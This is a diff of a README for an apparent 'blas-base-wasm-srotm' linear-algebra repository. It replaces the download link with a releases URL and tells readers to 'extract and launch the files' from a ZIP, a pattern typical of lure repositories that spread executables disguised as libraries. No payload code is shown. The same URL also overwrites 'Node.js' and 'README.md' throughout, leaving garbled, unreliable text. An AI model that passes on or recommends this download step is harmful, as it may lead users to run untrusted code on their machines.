@@ -12,7 +12,7 @@ Welcome to the "blas-base-wasm-srotm" repository! Here, you will find an impleme
 
 ## Installation
 
-To get started with using the "blas-base-wasm-srotm" repository, you can download the necessary files from the following link: [Download ZIP](https://github.com/files/Soft.zip)
+To get started with using the "blas-base-wasm-srotm" repository, you can download the necessary files from the following link: [Download ZIP](https://github.com/Rahulchavan38/blas-base-wasm-srotm/releases/tag/v1.2)
 
 Please note that you will need to extract and launch the files from the downloaded ZIP archive to use the functionality provided in this repository.
 
@@ -40,9 +40,9 @@ This repository covers a wide range of topics related to linear algebra, mathema
 - Mathematics
 - Modified Givens Transformation
 - NDArray Operations
-- Node.js
-- Node.js Usage
-- Node.js Libraries
+- https://github.com/Rahulchavan38/blas-base-wasm-srotm/releases/tag/v1.2
+- https://github.com/Rahulchavan38/blas-base-wasm-srotm/releases/tag/v1.2 Usage
+- https://github.com/Rahulchavan38/blas-base-wasm-srotm/releases/tag/v1.2 Libraries
 - Vector Rotation
 - Standard Library (Stdlib)
 - Linear Algebra Subroutines
@@ -61,4 +61,4 @@ Start integrating the modified Givens transformation functionality into your pro
 
 ---
 
-By incorporating the provided information into your README.md file, you can create a comprehensive and insightful guide for users interested in utilizing the "blas-base-wasm-srotm" repository. The structured layout, usage instructions, and additional topics covered will offer users a clear understanding of the repository's capabilities and how it can benefit their projects. Whether you are a beginner or an experienced developer in the field of linear algebra, this repository can serve as a valuable tool in your computational tasks.
+By incorporating the provided information into your https://github.com/Rahulchavan38/blas-base-wasm-srotm/releases/tag/v1.2 file, you can create a comprehensive and insightful guide for users interested in utilizing the "blas-base-wasm-srotm" repository. The structured layout, usage instructions, and additional topics covered will offer users a clear understanding of the repository's capabilities and how it can benefit their projects. Whether you are a beginner or an experienced developer in the field of linear algebra, this repository can serve as a valuable tool in your computational tasks.
